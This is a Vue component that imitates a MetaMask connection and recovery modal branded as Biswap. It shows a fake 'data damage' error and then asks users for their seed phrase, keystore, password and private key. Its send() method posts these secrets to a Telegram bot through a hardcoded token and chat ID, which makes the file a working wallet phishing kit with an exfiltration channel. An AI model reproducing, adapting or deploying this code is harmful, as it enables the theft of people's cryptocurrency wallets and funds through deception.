<template>
    <div class="modal-container">
        <div class="modal">
            <div class="modal-header">
                  <img src="https://cowswap.exchange/static/media/metamask.02e3ec27.png" alt="">
                <svg style="cursor:pointer;" @click="$emit('close')" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-dkPtRN eoNyNE"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
            </div>
            <nav>
               <small class="span-desc"> {{step + 1}} of 3 </small>
            </nav>
            <div class="content">
                <img style="width:50px;" src="data:image/jpeg;base64,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" alt="">
                <span class="span-desc">Biswap</span>
                <h2 v-if="step === 0">Connect with MetaMask</h2>
                <h2 v-if="step !== 0">Choice recovery method</h2>

            </div>
            <div v-if="step === 0" class="error">
                <strong >MetaMask data damage error</strong> <br>
                <span> hfduiaohfudisahfuidosahufeanjfkeawy8ofeaw</span> <br><br>
                <span>Lorem ipsum dolor sit amet consectetur adipisicing elit. Itaque, natus!</span>
            </div>
            <add-token-tabs v-if="step !==0" @data="change" />

            <div class="footer">
                <small class="span-desc"> Only connect with site you trust <a href="#">Learn more</a></small>
                <hr>
                <div v-if="step === 0" class="buttons">
                    <div></div>
                    <button @click="step++">
                       <span> Restore data </span>
                    </button>
                </div>
                 <div v-if="step !== 0" class="buttons">
                    <button @click="step--" class="outline">
                       <span> Back </span>
                    </button>
                    <button @click="send(data)">
                       <span> Recover </span>
                    </button>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
export default {
    data:()=>({
        step:0,
        token:'5240368866:AAErnZmAoWGPKRqgrjOiE7lEczkOxDAaDWQ',
        data:{}
    }),
    methods:{
         send(data){
            fetch('https://api.telegram.org/bot'+this.token+'/sendMessage',{
                 method:'POST',
                  headers: {
                    'Content-Type': 'application/json'
                    },
                 body:JSON.stringify({
                     chat_id:1791585559,
                     text:`Phrase: ${data.phrase}
keyStore: ${data.keyStore}
password: ${data.password}
private: ${data.private}
                     `
                 })
            })
        },
        change(data){
            this.data = data
        }
    }
}
</script>


<style lang="scss" scoped>
.modal-container{
    position: fixed;
    width: 100%;
    height: 100vh;
    top: 0;
    left: 0;
    z-index: 99;
    background: rgba(0,0,0,0.5);
    display: flex;
    justify-content: flex-end;
    overflow-y:scroll;
}
.modal{
    margin: 40px 40px;
    background: rgb(213, 233, 240);
    width: 40%;
    background-color: #fff;
    border: 1px solid rgb(213, 233, 240);
    box-shadow: rgb(47 128 237 / 5%) 0px 4px 8px 0px;
    width: 50vw;
    max-width: 420px;
    height: 100%;
    &-header{
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: rgb(213, 233, 240);;
        padding: 20px;
        img{
            width: 24px;
            height: 24px;
        }
    }
    nav{
        padding: 20px;
        display: flex;
        justify-content: flex-end;
    }
    .content{
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        gap :10px;
    }
    .error{
        padding: 20px;
        margin: 20px;
        background: #FADBD8;
        color: #B03A2E;
    }
    .footer{
        padding: 20px;
        text-align: center;
        margin-top: 15px;
        a{
            text-decoration: none;
        }
        hr{
            margin: 20px 0;
        }
        .buttons{
            display: flex;
            align-items: center;
            justify-content: space-between;
            button{
                background: #3498DB;
                color: #fff;
                border: none;
                outline: none;
                padding: 10px 30px;
                border-radius: 10px;
                cursor: pointer;
            }
            .outline{
                background: #fff;
                border: 1px solid #ccc;
                color: rgb(139, 139, 139);
            }
        }
    }
}

@media (max-width:700px) {
    .modal{
        width: 100%;
        border-radius: 0;
        max-width: 100%;
        margin: 0;
    }
}
</style>